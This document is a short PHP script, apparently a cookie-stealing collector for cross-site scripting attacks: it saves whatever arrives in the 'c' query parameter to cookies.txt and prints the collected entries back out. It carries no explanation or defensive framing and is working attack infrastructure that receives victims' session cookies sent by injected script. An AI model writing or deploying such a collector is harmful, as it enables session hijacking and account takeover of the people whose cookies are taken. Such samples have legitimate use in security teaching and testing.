<?php
  if (isset($_GET['c'])) {
    file_put_contents("cookies.txt", $_GET['c']."<br/>", FILE_APPEND);
  }

  $file = fopen("cookies.txt", "r");
  echo fread($file,filesize("cookies.txt"));
?>
